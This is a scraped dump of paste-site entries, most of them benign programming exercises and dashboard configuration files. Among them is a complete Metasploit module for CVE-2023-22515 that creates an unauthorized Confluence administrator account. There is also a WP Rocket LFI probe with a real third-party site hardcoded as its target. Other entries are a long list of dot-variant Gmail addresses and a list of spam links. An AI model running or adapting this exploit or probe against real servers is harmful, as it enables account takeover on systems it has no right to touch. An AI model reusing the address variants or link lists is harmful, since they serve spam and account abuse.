<a href=""mailto:ri.cha.rd.e.t.t.i.614@gmail.com"">ri.cha.rd.e.t.t.i.614@gmail.com</a>
<a href=""mailto:r.i.c.h.ar.de.tti.6.14@gmail.com"">r.i.c.h.ar.de.tti.6.14@gmail.com</a>
<a href=""mailto:richa.r.dett.i.6.1.4@gmail.com"">richa.r.dett.i.6.1.4@gmail.com</a>
<a href=""mailto:r.ic.ha.rde.t.t.i.6.1.4@gmail.com"">r.ic.ha.rde.t.t.i.6.1.4@gmail.com</a>
<a href=""mailto:r.ic.h.a.r.d.et.t.i.614@gmail.com"">r.ic.h.a.r.d.et.t.i.614@gmail.com</a>
<a href=""mailto:ri.c.har.dett.i.614@gmail.com"">ri.c.har.dett.i.614@gmail.com</a>
<a href=""mailto:r.ic.h.ar.d.et.ti6.14@gmail.com"">r.ic.h.ar.d.et.ti6.14@gmail.com</a>
<a href=""mailto:ri.c.ha.rd.e.t.ti.6.14@gmail.com"">ri.c.ha.rd.e.t.ti.6.14@gmail.com</a>
<a href=""mailto:r.ich.a.rdet.ti.6.14@gmail.com"">r.ich.a.rdet.ti.6.14@gmail.com</a>
<a href=""mailto:ri.cha.rdet.t.i614@gmail.com"">ri.cha.rdet.t.i614@gmail.com</a>
<a href=""mailto:r.ich.ard.et.ti61.4@gmail.com"">r.ich.ard.et.ti61.4@gmail.com</a>
<a href=""mailto:ric.h.ar.d.e.t.ti6.1.4@gmail.com"">ric.h.ar.d.e.t.ti6.1.4@gmail.com</a>
<a href=""mailto:r.i.ch.ard.e.tt.i.614@gmail.com"">r.i.ch.ard.e.tt.i.614@gmail.com</a>
<a href=""mailto:r.ich.a.r.det.ti.61.4@gmail.com"">r.ich.a.r.det.ti.61.4@gmail.com</a>
<a href=""mailto:ri.c.ha.r.de.tti6.1.4@gmail.com"">ri.c.ha.r.de.tti6.1.4@gmail.com</a>
<a href=""mailto:r.ich.ar.det.t.i61.4@gmail.com"">r.ich.ar.det.t.i61.4@gmail.com</a>
<a href=""mailto:ric.h.a.r.d.e.t.t.i614@gmail.com"">ric.h.a.r.d.e.t.t.i614@gmail.com</a>
<a href=""mailto:richa.r.det.t.i614@gmail.com"">richa.r.det.t.i614@gmail.com</a>
<a href=""mailto:r.i.ch.a.r.d.etti6.14@gmail.com"">r.i.ch.a.r.d.etti6.14@gmail.com</a>
<a href=""mailto:r.ichar.d.e.t.t.i.6.1.4@gmail.com"">r.ichar.d.e.t.t.i.6.1.4@gmail.com</a>
<a href=""mailto:ri.ch.ard.etti.6.14@gmail.com"">ri.ch.ard.etti.6.14@gmail.com</a>
<a href=""mailto:r.ich.ar.de.tt.i61.4@gmail.com"">r.ich.ar.de.tt.i61.4@gmail.com</a>
<a href=""mailto:ri.ch.a.r.d.et.ti614@gmail.com"">ri.ch.a.r.d.et.ti614@gmail.com</a>
<a href=""mailto:ri.ch.a.rd.ett.i.614@gmail.com"">ri.ch.a.rd.ett.i.614@gmail.com</a>
<a href=""mailto:richa.rde.tti61.4@gmail.com"">richa.rde.tti61.4@gmail.com</a>
<a href=""mailto:ri.ch.a.rde.t.t.i.6.14@gmail.com"">ri.ch.a.rde.t.t.i.6.14@gmail.com</a>
<a href=""mailto:r.ic.h.a.r.detti.61.4@gmail.com"">r.ic.h.a.r.detti.61.4@gmail.com</a>
<a href=""mailto:r.i.cha.r.det.ti.6.1.4@gmail.com"">r.i.cha.r.det.ti.6.1.4@gmail.com</a>
<a href=""mailto:rich.arde.tti6.1.4@gmail.com"">rich.arde.tti6.1.4@gmail.com</a>
<a href=""mailto:ri.ch.ard.ett.i6.14@gmail.com"">ri.ch.ard.ett.i6.14@gmail.com</a>
<a href=""mailto:ri.c.h.ardet.t.i61.4@gmail.com"">ri.c.h.ardet.t.i61.4@gmail.com</a>
<a href=""mailto:r.i.c.har.d.etti.61.4@gmail.com"">r.i.c.har.d.etti.61.4@gmail.com</a>
<a href=""mailto:r.i.charde.t.t.i.6.14@gmail.com"">r.i.charde.t.t.i.6.14@gmail.com</a>
<a href=""mailto:r.i.c.har.de.tti6.14@gmail.com"">r.i.c.har.de.tti6.14@gmail.com</a>
<a href=""mailto:ri.chardet.t.i6.1.4@gmail.com"">ri.chardet.t.i6.1.4@gmail.com</a>
<a href=""mailto:r.i.c.h.ar.d.e.tt.i.614@gmail.com"">r.i.c.h.ar.d.e.tt.i.614@gmail.com</a>
<a href=""mailto:ri.ch.arde.tti.6.1.4@gmail.com"">ri.ch.arde.tti.6.1.4@gmail.com</a>
<a href=""mailto:r.i.ch.a.r.de.t.ti614@gmail.com"">r.i.ch.a.r.de.t.ti614@gmail.com</a>
<a href=""mailto:ric.h.ar.d.e.tt.i6.1.4@gmail.com"">ric.h.ar.d.e.tt.i6.1.4@gmail.com</a>
<a href=""mailto:r.ich.a.r.d.e.t.t.i6.14@gmail.com"">r.ich.a.r.d.e.t.t.i6.14@gmail.com</a>
<a href=""mailto:ric.ha.r.det.ti6.1.4@gmail.com"">ric.ha.r.det.ti6.1.4@gmail.com</a>
<a href=""mailto:richa.rd.e.tti61.4@gmail.com"">richa.rd.e.tti61.4@gmail.com</a>
<a href=""mailto:ri.c.h.ar.d.ett.i614@gmail.com"">ri.c.h.ar.d.ett.i614@gmail.com</a>
<a href=""mailto:ric.h.a.r.de.tt.i.6.1.4@gmail.com"">ric.h.a.r.de.tt.i.6.1.4@gmail.com</a>
<a href=""mailto:richa.rde.tti614@gmail.com"">richa.rde.tti614@gmail.com</a>
<a href=""mailto:r.icha.rdetti.61.4@gmail.com"">r.icha.rdetti.61.4@gmail.com</a>
<a href=""mailto:ric.h.a.rde.tti.6.14@gmail.com"">ric.h.a.rde.tti.6.14@gmail.com</a>
<a href=""mailto:ric.h.ar.de.tti.6.14@gmail.com"">ric.h.ar.de.tti.6.14@gmail.com</a>
<a href=""mailto:r.i.c.h.a.r.detti6.14@gmail.com"">r.i.c.h.a.r.detti6.14@gmail.com</a>
<a href=""mailto:r.ic.h.arde.t.ti.6.14@gmail.com"">r.ic.h.arde.t.ti.6.14@gmail.com</a>
<a href=""mailto:r.i.cha.rde.tt.i.6.1.4@gmail.com"">r.i.cha.rde.tt.i.6.1.4@gmail.com</a>
<a href=""mailto:r.icharde.tti614@gmail.com"">r.icharde.tti614@gmail.com</a>
<a href=""mailto:r.ic.ha.r.d.etti6.14@gmail.com"">r.ic.ha.r.d.etti6.14@gmail.com</a>
<a href=""mailto:ri.cha.r.de.t.t.i.6.1.4@gmail.com"">ri.cha.r.de.t.t.i.6.1.4@gmail.com</a>
<a href=""mailto:r.i.c.ha.r.d.e.tti61.4@gmail.com"">r.i.c.ha.r.d.e.tti61.4@gmail.com</a>
<a href=""mailto:r.i.cha.rdet.ti.614@gmail.com"">r.i.cha.rdet.ti.614@gmail.com</a>
<a href=""mailto:ri.ch.a.rd.et.t.i.6.1.4@gmail.com"">ri.ch.a.rd.et.t.i.6.1.4@gmail.com</a>
<a href=""mailto:ri.ch.ard.e.t.t.i.61.4@gmail.com"">ri.ch.ard.e.t.t.i.61.4@gmail.com</a>"
qzgWCK0X,# bulk_rename_crdownload.py,here2share,Python,Thursday 29th of February 2024 09:47:40 AM CDT,"# bulk_rename_crdownload.py

import os
import tkinter
from tkinter import filedialog

root = tkinter.Tk()
root.withdraw() # Hide the root window
folder = filedialog.askdirectory(parent=root, title=""Choose a folder"")
files = os.listdir(folder)

for file in files:
    if file.endswith("".crdownload""):
        new_file = file.replace("".crdownload"", """")
        os.rename(os.path.join(folder, file), os.path.join(folder, new_file))
        print(f""Renamed {file} to {new_file}"")
    else:
        new_file = file+"".crdownload""
        os.rename(os.path.join(folder, file), os.path.join(folder, new_file))
        print(f""Renamed {file} to {new_file}"")"
KXCQXWDr,Untitled,ZondaKeN,Rust,Thursday 29th of February 2024 09:46:17 AM CDT,"#![allow(warnings)]

use std::cell::Cell;

pub struct Model
{
    x: i32
}

pub struct View<'a> {
    model: &'a Cell<Model>,
}

pub struct Controller<'a> {
    model: &'a Cell<Model>,
    view: &'a View<'a>,
}

impl View<'_>
{
    pub fn render(&self)
    {
        println!(""Render..."");
    }
}

trait Observer<T1>
{
    fn invoke(&self, arg1: T1);
}

struct Event<T1>
{
    subscribers: Vec<Box<dyn Observer<T1>>>
}

impl<T1> Event<T1>
{
    fn subscribe(&mut self, arg: impl Observer<T1> + 'static)
    {
        self.subscribers.push(Box::new(arg));
    }

    fn invoke(&self, arg1: T1) where T1 : Clone
    {
        for subscriber in &self.subscribers
        {
            subscriber.invoke(arg1.clone());
        }
    }
}

impl<'a> Controller<'a>
{
    pub fn new(model: &'a Cell<Model>, view: &'a View<'a>) -> Self
    {
        let controller = Controller { model, view };
        //view.add_observer(ViewObserver {});
        return controller;
    }

    pub fn run(&mut self)
    {
        self.view.render();
    }
}

fn main() {
    let model = Cell::new(Model { x: 42 });
    let view = View { model: &model };
    let mut controller = Controller::new(&model, &view);
    controller.run();
}
"
xr47MGTm,CombiningIntoOneCollection,UrayFenn,C#,Thursday 29th of February 2024 09:22:15 AM CDT,"namespace CombiningIntoOneCollection
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] firstNumbers = { 1, 2, 1 };
            int[] secondNumbers = { 3, 2 };
            List<int> list = new List<int>();

            AddValue(list, firstNumbers);
            AddValue(list, secondNumbers);
            EnumerationNumber(list);
        }

        static void AddValue(List<int> list, int[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                if (list.Contains(array[i]) == false)
                {
                    list.Add(array[i]);
                }
            }
        }

        static void EnumerationNumber(List<int> list)
        {
            foreach (var number in list)
            {
                Console.Write(number + "" "");
            }
        }
    }
}"
gkqPPLrC,Atlassian Confluence Data Center and Server - Authentication Bypass (Metasploit) - CVE-2023-22515,FlyFar,Python,Thursday 29th of February 2024 09:19:04 AM CDT,"##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control',
        'Description' => %q{
          This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass.
          A specially crafted request can be create new admin account without authentication on the target Atlassian server.
        },
        'Author' => [
          'Unknown', 
          'Emir Polat' # metasploit module
        ],
        'References' => [
          ['CVE', '2023-22515'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515'],
          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis']
        ],
        'DisclosureDate' => '2023-10-04',
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/login.action')
    )
    return Exploit::CheckCode::Unknown unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id=""poweredby""]/li[@class=""print-only""]/text()').first&.text
    return Exploit::CheckCode::Safe unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    confluence_version = Rex::Version.new(Regexp.last_match(1))

    vprint_status(""Detected Confluence version: #{confluence_version}"")

    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.2')) ||
       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.2')) ||
       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.1'))
      return Exploit::CheckCode::Appears(""Exploitable version of Confluence: #{confluence_version}"")
    end

    Exploit::CheckCode::Safe(""Confluence version: #{confluence_version}"")
  end

  def run
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/server-info.action'),
      'vars_get' => {
        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
      }
    )

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200

    print_good('Found server-info.action! Trying to ignore setup.')

    created_user = create_admin_user

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/finishsetup.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      }
    )

    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user

    print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200

    create_credential({
      workspace_id: myworkspace_id,
      origin_type: :service,
      module_fullname: fullname,
      username: datastore['NEW_USERNAME'],
      private_type: :password,
      private_data: datastore['NEW_PASSWORD'],
      service_name: 'Atlassian Confluence',
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      protocol: 'tcp',
      status: Metasploit::Model::Login::Status::UNTRIED
    })

    print_good(""Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}"")
    print_good(""Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action"")
  end

  def create_admin_user
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/setupadministrator.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      },
      'vars_post' => {
        'username' => datastore['NEW_USERNAME'],
        'fullName' => 'New Admin',
        'email' => datastore['NEW_EMAIL'],
        'password' => datastore['NEW_PASSWORD'],
        'confirm' => datastore['NEW_PASSWORD'],
        'setup-next-button' => 'Next'
      }
    )
    res&.code == 302
  end
end
            "
jJskKadi,WP Rocket < 2.10.3 - Local File Inclusion (LFI),FlyFar,Python,Thursday 29th of February 2024 09:16:55 AM CDT,"
import requests
import time

def check_wp_rocket_version(url):
    version_url = url + ""/wp-rocket/css/rocket.css""
    try:
        response = requests.get(version_url)
        version = response.headers[""X-Powered-By""]
        if ""WP Rocket/"" in version:
            version = version.split(""/"")[1]
            return version
    except Exception as e:
        print(f""Error occurred while fetching WP Rocket version: {e}"")
    return None

def test_wp_rocket_lfi_bug(url):
    lfi_url = url + ""/wp-rocket/inc/vendor/composer/installed.json""
    try:
        response = requests.get(lfi_url)
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f""Error occurred while testing LFI: {e}"")
    return False

def main():
    url = ""http://arvatools.com""
    wp_rocket_version = check_wp_rocket_version(url)
    if wp_rocket_version:
        print(f""WP Rocket Version: {wp_rocket_version}"")
        if wp_rocket_version in [""2.10.0"", ""2.10.1"", ""2.10.2"", ""2.10.3""]:
            result = test_wp_rocket_lfi_bug(url)
            if result:
                print(""LFI vulnerability found in WP Rocket"")
            else:
                print(""LFI vulnerability not found in WP Rocket"")
        else:
            print(""WP Rocket version is not affected by the LFI bug"")
    else:
        print(""Unable to fetch WP Rocket version"")

if __name__ == ""__main__"":
    main()
            "
z86mPLNs,PersonnelAccountingAdvance,UrayFenn,C#,Thursday 29th of February 2024 09:11:15 AM CDT,"namespace PersonnelAccountingAdvance
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddDossier = ""1"";
            const string CommandShowAllDossier = ""2"";
            const string CommandDeleteDossier = ""3"";
            const string CommandExitProgram = ""4"";

            Dictionary<string, string> listEmployees = new Dictionary<string, string>();
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Выберите команду:"");
                Console.WriteLine($""{CommandAddDossier} - Добавить досье."");
                Console.WriteLine($""{CommandShowAllDossier} - Показать список всех досье."");
                Console.WriteLine($""{CommandDeleteDossier} - Удалить досье."");
                Console.WriteLine($""{CommandExitProgram} - Выход их программы."");
                string userInput = Console.ReadLine();
                Console.Clear();

                switch (userInput)
                {
                    case CommandAddDossier:
                        AddDossier(listEmployees);
                        break;

                    case CommandShowAllDossier:
                        ShowAllDossier(listEmployees);
                        break;

                    case CommandDeleteDossier:
                        DeleteDossier(listEmployees);
                        break;

                    case CommandExitProgram:
                        Console.WriteLine(""Вы вышли из программы."");
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод, попробуйте ввести другую команду."");
                        break;
                }
            }
        }

        static void AddDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника:"");
            string employeeName = Console.ReadLine();
            Console.WriteLine(""Укажите должность сотрудника:"");
            string employeePosition = Console.ReadLine();

            if (listEmployees.ContainsKey(employeeName))
            {
                Console.WriteLine($""{employeeName} - Уже есть в списке сотрудников."");
            }
            else
            {
                Console.WriteLine($""{employeeName} - Добавлен в список"");
                listEmployees.Add(employeeName, employeePosition);
            }
        }

        static void ShowAllDossier (Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Список всех сотрудников:"");

            foreach(var file in listEmployees)
            {
                Console.WriteLine(file.Key + "" "" + file.Value + "" - "");
            }
        }

        static void DeleteDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника для удаления досье:"");
            string userInput = Console.ReadLine();

            if (listEmployees.ContainsKey(userInput))
            {
                Console.WriteLine($""Досье {userInput} {listEmployees[userInput]} - удалено!"");
                listEmployees.Remove(userInput);
            }
            else
            {
                Console.WriteLine(""Досье такого сотрудника не обнаружено."");
            }
        }
    }
}"
iTLx7VYs,majong,excellent940707,C++,Thursday 29th of February 2024 08:54:14 AM CDT,"#include<bits/stdc++.h>
using namespace std;
bool check(int count_two, int cnt[]){

    bool is_zero=1;
    for(int i=0;i<34;++i){
        if(cnt[i]>0){
            is_zero=0;
            break;
        }
    }
    if(is_zero)return 1;

    bool valid=0;
    for(int i=0;i<34;++i){
        if(cnt[i]>=3){
            cnt[i]-=3;
            valid |= check(count_two, cnt);
            cnt[i]+=3;
        }
    }
    if(count_two>0){
        for(int i=0;i<34;++i){
            if(cnt[i]>=2){
                cnt[i]-=2;
                valid |= check(count_two-1, cnt);
                cnt[i]+=2;
            }
        }
    }
    for(int i=0;i<=6;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=9;i<=15;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=18;i<=24;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=27;i<=31;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
    return valid;
}
int main() {
     int num,cnt[34]={0};
     for(int i=0;i<17;++i){
        cin>>num;
        cnt[num]+=1;
     }
     cout<<check(1,cnt)<<'\n';
    return 0;
}"
WL3jL4Hu,HanomanPribadi,PapiGemezs,PHP,Thursday 29th of February 2024 08:45:18 AM CDT,"{
   ""Pribadi"": [
      {
         ""version"": 1.1
      }
   ]
}"
yKECnWfX,widgets,denogginizer,YAML,Thursday 29th of February 2024 08:37:04 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/service-widgets
# - logo:
    # icon: https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/I_Love_New_York.svg/1101px-I_Love_New_York.svg.png # optional
- resources:
    label: Open Media Vault
    cpu: true
    memory: true
    disk: /
    cputemp: true
    uptime: true
    units: imperial


- search:
    provider: duckduckgo
    target: _blank
- datetime:
    text_size: sm
    format:
      dateStyle: short
      timeStyle: short
- openweathermap:
    #label: Home #optional
    latitude: your lat
    longitude: your long
    units: imperial # or imperial
    provider: openweathermap
    apiKey: your-api # required only if not using provider, this reveals api key in requests
    cache: 5 # Time in minutes to cache API responses, to stay within limits"
L8CFmryK,docker,denogginizer,YAML,Thursday 29th of February 2024 08:36:28 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/docker/

my-docker:
   host: homepage-dockerproxy
   port: 2375
my-docker-dagobah:
   host: 192.168.50.105
   port: 2375
"
mTVRCEex,awefdvesntes,gadungw71,PHP,Thursday 29th of February 2024 08:33:54 AM CDT,"https://www.charidy.com/1709189305582777975
https://www.charidy.com/1709189656213528682
https://www.charidy.com/1709190130104794165
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=373
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=374
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=373
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=374
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=373
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=374
https://www.taskade.com/p/hd-01HQSX4PYVX4CR431SQQAE75RE
https://www.taskade.com/p/hd-01HQSXMPX9EQSW53W92QR19NJH
https://www.taskade.com/p/2024-tw-01HQSXV0ZN0R8JHRXHHQ6P4J3N
https://github.com/napicudayav1
https://github.com/orgs/mobiggr/discussions/3186
https://github.com/tevaxusenuv15
https://github.com/hayufisik
https://github.com/orgs/mobiggr/discussions/3198
https://github.com/dagosikoyep
https://github.com/orgs/mobiggr/discussions/3233
https://github.com/ziduxodeben17
https://github.com/orgs/mobiggr/discussions/3234
https://github.com/batetevorix19
https://github.com/orgs/mobiggr/discussions/3238
https://demo.hedgedoc.org/s/pqeFJCxfA
https://paiza.io/projects/yhCf45nFs2qKkTulezl2Rg?language=php
https://pastelink.net/9nheybiz
https://hackmd.io/@rerewilli6/HJBi4G0h6
https://snippet.host/whtudm
https://tempaste.com/3ksUNKMXgYE
https://rentry.co/rro455dw
https://binshare.net/SyKOC9FFQKgjRNqsELQA
https://rift.curseforge.com/paste/fb874ebe
https://telegra.ph/slowewww-02-29"
tWn51GHk,settings,denogginizer,YAML,Thursday 29th of February 2024 08:30:32 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/settings
title: Start

providers:
  openweathermap: your-api
  weatherapi: your-api
  
background:
  #image: https://images.unsplash.com/photo-1502790671504-542ad42d5189?auto=format&fit=crop&w=2560&q=80
  image: /images/satellite_03.jpg
  blur: sm # sm, """", md, xl... see https://tailwindcss.com/docs/backdrop-blur
  saturate: 50 # 0, 50, 100... see https://tailwindcss.com/docs/backdrop-saturate
  brightness: 50 # 0, 50, 75... see https://tailwindcss.com/docs/backdrop-brightness
  opacity: 50 # 0-100
  
headerStyle: clean

# color: stone
color: sky

showStats: true
  
layout:

  Home:
    tab: Home
    style: row
    columns: 2
    useEqualHeights: true

  Server Monitor:
    tab: Server Monitor
    style: row
    columns: 3
  Disk Usage:
    tab: Disk Usage
    style: row
    columns: 4
    
  Containers:
    tab: Containers
    style: row
    columns: 3

  Media:
    tab: Media
    style: row
    columns: 4
    
  Streaming Now:
    tab: Streaming Now
    style: row
    columns: 2
    
  Feeds:
    tab: Feeds
    style: column
    columns: 2

  Bookmark Group on Fourth Tab:
    style: row
    columns: 6

  Service Group on every Tab:
    style: row
    columns: 6
"
02P1KkGQ,final B,_ums_,Go,Thursday 29th of February 2024 08:18:48 AM CDT,"package main

import (
	""fmt""
	""io/ioutil""
	""sort""
	""strconv""
	""strings""
)

type Node struct {
	value int
	left  *Node
	right *Node
}

type tTmpStore struct {
	leftIndex  int
	rightIndex int
}

func slice2BinaryTree(ss []string, n int) (*Node, []int) {
	if len(ss) == 0 {
		return nil, nil
	}
	var allKeys []int
	myset := make(map[int]bool)
	list := make([]*Node, n)
	m := make(map[int]tTmpStore, n)
	for i := 0; i < n; i++ {
		ss[i] = strings.TrimSpace(ss[i])
		if ss[i] == """" {
			continue
		}

		tmp := strings.Split(ss[i], "" "")
		if len(tmp) < 4 {
			panic(""wrong tree data '"" + ss[i] + ""'"")
		}

		list[i] = &Node{}
		list[i].value, _ = strconv.Atoi(tmp[1])
		myset[list[i].value] = true
		ts := tTmpStore{}
		if tmp[2] != ""-1"" {
			ts.leftIndex, _ = strconv.Atoi(tmp[2])
		}
		if tmp[3] != ""-1"" {
			ts.rightIndex, _ = strconv.Atoi(tmp[3])
		}

		m[i] = ts
	}
	for key, _ := range myset {
		allKeys = append(allKeys, key)
	}
	sort.Ints(allKeys)

	for i := 0; i < n; i++ {
		ts := m[i]
		if ts.leftIndex != 0 {
			list[i].left = list[ts.leftIndex-1]
		}
		if ts.rightIndex != 0 {
			list[i].right = list[ts.rightIndex-1]
		}
	}

	return list[0], allKeys
}

func checkCorrectBst(tree *Node, allKeys map[int]bool) int {
	if tree == nil {
		return 0
	}
	if allKeys[tree.value] != true {
		panic(""Unknown key"")
	}
	size := 1

	if tree.left != nil {
		if tree.left.value > tree.value {
			panic(""Left child is bigger than its parent"")
		}
		size += checkCorrectBst(tree.left, allKeys)
	}
	if tree.right != nil {
		if tree.right.value < tree.value {
			panic(""Right child is smaller than its parent"")
		}
		size += checkCorrectBst(tree.right, allKeys)
	}
	return size
}

// through input.txt
func main() {
	bs, err := ioutil.ReadFile(""input.txt"")
	if err != nil {
		panic(err)
	}

	ss := strings.Split(string(bs), ""\n"")
	if len(ss) < 2 {
		panic(""wrong input"")
	}
	test_type := ss[0]
	n, _ := strconv.Atoi(ss[1])
	tree := &Node{}
	tree = nil
	allKeys := make([]int, 0)
	if n > 0 {
		tree, allKeys = slice2BinaryTree(ss[2:], n)
	}
	if test_type == ""correctness"" {
		toRemove, _ := strconv.Atoi(ss[n+2])
		tree = remove(tree, toRemove)
		myset := make(map[int]bool)
		expectedSize := len(allKeys)

		for _, key := range allKeys {
			myset[key] = true
			if key == toRemove {
				expectedSize -= 1
			}
		}
		actualSize := checkCorrectBst(tree, myset)
		if actualSize != expectedSize {
			panic(""Size of Bst does not match with the answer"")
		}
		fmt.Println(""Correct"")
	} else {
		for _, key := range allKeys {
			tree = remove(tree, key)
		}
		if tree != nil {
			fmt.Println(""FAIL: non-null"")
		} else {
			fmt.Println(""OK: null"")
		}
	}
}

func remove(node *Node, key int) *Node {

	// если дерево пустое
	if node == nil {
		return nil
	}

	deletedNode, prev := findNode(node, nil, key)

	if deletedNode == nil {
		return node
	}

	if deletedNode.right == nil || deletedNode.left == nil {
		var newNode *Node

		if deletedNode.left == nil {
			newNode = deletedNode.right
		} else {
			newNode = deletedNode.left
		}

		if prev == nil {
			return newNode
		}

		if deletedNode == prev.left {
			prev.left = newNode
		} else {
			prev.right = newNode
		}

		deletedNode = nil
	} else {

		leftMaxNode, prevLeftMaxNode := findLeftMaxNode(deletedNode.left, deletedNode)
		deletedNode.value = leftMaxNode.value
		prevLeftMaxNode.right = nil
		leftMaxNode = nil
	}

	return node
}

func findNode(root *Node, prev *Node, value int) (*Node, *Node) {
	if root == nil {
		return nil, nil
	}

	if value < root.value {
		return findNode(root.left, root, value)
	}

	if value > root.value {
		return findNode(root.right, root, value)
	}

	var node *Node
	if value == root.value {
		node = root
	}

	return node, prev
}

func findLeftMaxNode(node, prev *Node) (*Node, *Node) {
	root := node
	for root.right != nil {
		prev = root
		root = root.right
	}
	return root, prev
}
"
mbH8FuW7,Lesson22,smatskevich,C++,Thursday 29th of February 2024 07:55:40 AM CDT,"#include <iostream>
using namespace std;
struct Node {
  int Data;
  Node* Left = nullptr;
  Node* Right = nullptr;
};

void DFS(Node* node) {
  cout << node->Data << "" "";
  if (node->Left) {
    DFS(node->Left);
    cout << node->Data << "" "";
  }
  if (node->Right) {
    DFS(node->Right);
    cout << node->Data << "" "";
  }
}

int main1() {
  Node* root = nullptr;
  int x;
  while (cin >> x, x != 0) {
    if (!root) {
      root = new Node();
      root->Data = x;
      continue;
    }
    Node* node = root;
    while (true) {
      if (node->Data == x) break;
      if (node->Data < x) {
        if (node->Right == nullptr) {
          node->Right = new Node();
          node->Right->Data = x;
          break;
        }
        node = node->Right;
      } else {
        if (node->Left == nullptr) {
          node->Left = new Node();
          node->Left->Data = x;
          break;
        }
        node = node->Left;
      }
    }
  }
  DFS(root);
  return 0;
}

void PreOrderDFS(vector<vector<int>>& t, int u, int p) {
  cout << u << ""\n"";
  for (int v : t[u]) {
    if (v != p)
      PreOrderDFS(t, v, u);
  }
}

int main() {
  int n; cin >> n;
  vector<vector<int>> t(n + 1);
  for (int i = 0; i < n - 1; ++i) {
    int u, v; cin >> u >> v;
    t[u].push_back(v);
    t[v].push_back(u);
  }
  PreOrderDFS(t, 1, -1);
}"
5WWbsjLF,Untitled,asmo12,Batch,Thursday 29th of February 2024 07:55:06 AM CDT,"@echo off
SETLOCAL ENABLEEXTENSIONS 
:: use command  - this_batch_file.cmd src trg 
